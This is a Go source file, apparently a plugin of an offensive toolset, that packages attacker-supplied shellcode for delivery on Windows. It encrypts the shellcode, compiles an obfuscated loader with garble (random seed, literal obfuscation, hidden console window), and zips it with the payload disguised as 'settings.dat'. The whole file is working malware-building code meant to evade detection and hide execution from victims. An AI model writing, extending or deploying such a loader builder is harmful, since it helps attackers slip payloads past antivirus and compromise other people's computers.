package plugins

import (
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"toolset/utils"
)

type ShellcodeLoader struct {
	BasePlugin
	shellcode  []byte
	reGenerate bool // 是否强制重新生成loader
	x64        bool // 是否为x64 shellcode
}

func NewShellcodeLoader(shellcode []byte, reGenerate, x64 bool) *ShellcodeLoader {
	return &ShellcodeLoader{
		BasePlugin: BasePlugin{
			PluginName: "shellcode_runner",
		},
		shellcode:  shellcode,
		reGenerate: reGenerate,
		x64:        x64,
	}
}

// getLoaderPath 获取生成的loader的路径
func (l *ShellcodeLoader) getLoaderPath() string {
	loaderFilename := "loader_windows_386.exe"
	if l.x64 {
		loaderFilename = "loader_windows_amd64.exe"
	}
	return filepath.Join(l.GetPluginDataPath(), "output", loaderFilename)
}

// getBuildWorkDir 获取执行编译命令的工作目录
func (l *ShellcodeLoader) getBuildWorkDir() string {
	wd := "windows_386"
	if l.x64 {
		wd = "windows_amd64"
	}
	return filepath.Join(l.GetPluginDataPath(), wd)
}

// getShellcodeData 对shellcode做变形后的data
func (l *ShellcodeLoader) getShellcodeData() []byte {
	return utils.CustomEncryptData(l.shellcode)
}

// loaderIsExist 获取shellcode loader是否存在
func (l *ShellcodeLoader) loaderIsExist() bool {
	isExistRunner := utils.PathExist(l.getLoaderPath())
	return isExistRunner
}

// getZipPath 获取loader和payload打包文件路径
func (l *ShellcodeLoader) getZipPath() (string, error) {
	shellcodeData := l.getShellcodeData()
	loaderData, err := l.getLoader()
	if err != nil {
		return "", err
	}
	var files = []utils.FileData{
		{
			Name: "loader.exe",
			Body: loaderData,
		},
		{
			Name: "settings.dat",
			Body: shellcodeData,
		},
	}
	return utils.ZipData(files)
}

func (l *ShellcodeLoader) Run() ([]byte, error) {
	zipPath, err := l.getZipPath()
	if err != nil {
		return nil, err
	}
	defer os.Remove(zipPath)
	return ioutil.ReadFile(zipPath)
}

func (l *ShellcodeLoader) getLoader() ([]byte, error) {
	loaderIsExist := l.loaderIsExist()
	// 如果loader不存在或者用户指定重新生成，则重新生成loader
	env := os.Environ()
	env = append(env, "GOOS=windows")
	if l.x64 {
		env = append(env, "GOARCH=amd64")
	} else {
		env = append(env, "GOARCH=386")
	}
	if !loaderIsExist || l.reGenerate {
		cmd := exec.Command("garble", "-seed=random", "-literals", "-tiny", "build", "-ldflags", "-H windowsgui", "-o", l.getLoaderPath(), "main.go")
		cmd.Dir = l.getBuildWorkDir()
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		cmd.Env = env
		err := cmd.Run()
		if err != nil {
			return nil, err
		}
	}
	return ioutil.ReadFile(l.getLoaderPath())
}
